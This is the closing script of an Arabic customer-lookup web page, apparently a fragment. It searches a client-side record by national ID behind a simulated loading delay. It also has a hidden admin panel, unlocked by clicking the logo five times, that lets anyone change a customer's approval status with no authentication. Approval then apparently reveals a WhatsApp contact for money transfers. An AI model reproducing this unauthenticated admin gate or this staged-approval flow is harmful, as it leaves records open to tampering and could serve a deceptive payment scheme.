    // ❌ في باقي الحالات: لا يظهر أي زر تواصل مع التحويلات المالية

    resultArea.innerHTML = html;
    document.getElementById('errorBox').style.display = 'none';
  }

  function toggleAdmin() {
    isAdmin = !isAdmin;
    document.getElementById('adminPanel').classList.toggle('show', isAdmin);
  }

  function updateAdminStatus(status) {
    const statusMap = {
      'approved': '✅ موافقة',
      'review': '⏳ قيد المراجعة',
      'rejected': '❌ مرفوض',
      'invalid': '⚠️ بيانات غير صحيحة',
      'pending-approval': '🔄 قيد الموافقة'
    };
    const el = document.getElementById('currentStatusText');
    if (el) el.textContent = statusMap[status] || 'غير محدد';
  }

  function changeStatus(newStatus) {
    if (!currentClient || !currentNationalId) { alert('⚠️ يرجى البحث عن عميل أولاً.'); return; }
    if (customersDatabase[currentNationalId]) {
      customersDatabase[currentNationalId].status = newStatus;
      currentClient.status = newStatus;
      updateAdminStatus(newStatus);
      displayResult(customersDatabase[currentNationalId], currentNationalId);
      alert(`✅ تم تغيير حالة العميل ${currentClient.name} إلى "${newStatus}" بنجاح.`);
    }
  }

  function searchCustomer() {
    const nationalId = document.getElementById('nationalId').value.trim();
    if (!nationalId) { alert('⚠️ الرجاء إدخال الرقم القومي'); return; }
    if (nationalId.length !== 14) { alert('⚠️ الرقم القومي يجب أن يكون 14 رقمًا'); return; }

    document.getElementById('loader').style.display = 'block';
    document.getElementById('resultArea').innerHTML = '';
    document.getElementById('errorBox').style.display = 'none';

    setTimeout(() => {
      document.getElementById('loader').style.display = 'none';
      const found = customersDatabase[nationalId];
      if (found) {
        found.id = nationalId;
        displayResult(found, nationalId);
      } else {
        document.getElementById('errorBox').style.display = 'block';
        currentClient = null;
        currentNationalId = '';
        updateAdminStatus('غير محدد');
      }
    }, 800);
  }

  document.getElementById('brandLogo')?.addEventListener('click', function() {
    adminClickCount++;
    if (adminClickCount >= 5) { toggleAdmin(); adminClickCount = 0; }
    setTimeout(() => { adminClickCount = 0; }, 3000);
  });

  document.getElementById('nationalId')?.addEventListener('keypress', e => {
    if (e.key === 'Enter') searchCustomer();
  });

  window.searchCustomer = searchCustomer;
  window.changeStatus = changeStatus;
  window.openWhatsApp = openWhatsApp;
</script>

</body>
</html>
